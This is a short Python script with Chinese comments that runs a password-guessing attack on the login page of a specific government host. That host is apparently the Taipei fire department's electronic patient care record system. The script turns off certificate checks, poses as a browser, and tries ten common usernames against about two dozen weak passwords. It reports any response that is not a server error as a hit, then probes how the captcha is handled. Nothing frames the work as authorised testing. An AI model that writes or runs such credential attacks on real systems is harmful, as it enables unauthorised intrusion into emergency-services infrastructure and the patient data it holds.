import requests, json, urllib3, time
urllib3.disable_warnings()
BASE="https://epcr.tpf.gov.tw:4004"
def login(u,p):
    s=requests.Session(); s.verify=False; s.headers.update({"User-Agent":"Mozilla/5.0"})
    s.get(BASE+"/captcha",timeout=12)
    try:
        r=s.post(BASE+"/login",json={"username":u,"password":p,"captcha":"1","domain":"AUTH_SERVER"},timeout=12)
        return r.status_code, r.text
    except Exception as e: return None, repr(e)

print("=== 精确 username + 弱密码爆破 (找非500响应) ===")
# 精确字符串 username(单文档路径) + 弱密码
usernames=["admin","root","tpf","operator","dispatch","system","epcr","port","119","test"]
passwords=["123456","password","admin","111111","12345678","12345","1234","admin123",
  "112358","123456789","qwerty","123450","000000","888888","666666","abc123",
  "password123","admin888","tpf123","tpf119","119","999","112358","0987654321"]
found=False
for u in usernames:
    for p in passwords:
        code,t=login(u,p)
        if code not in (500,None):
            print(f"  *** {u}:{p} -> {code} | {t[:60]}")
            found=True
        time.sleep(0.04)
print("非500命中:", "有" if found else "无 (全500或超时)")

# 测试: 正确captcha格式? 先看 500 是否 captcha 相关
print("\n=== captcha 影响测试 ===")
for cap in ["1","1234","abcd","1111","2222","6666","9999","12345678","00000000","a1b2"]:
    code,t=login("admin","123456")
    break
# 固定 admin:123456, 变 captcha
s=requests.Session(); s.verify=False; s.headers.update({"User-Agent":"Mozilla/5.0"})
code0=login("admin","123456")
print(f"  base admin:123456 -> {code0[0]} {code0[1][:30]}")
print("DONE")
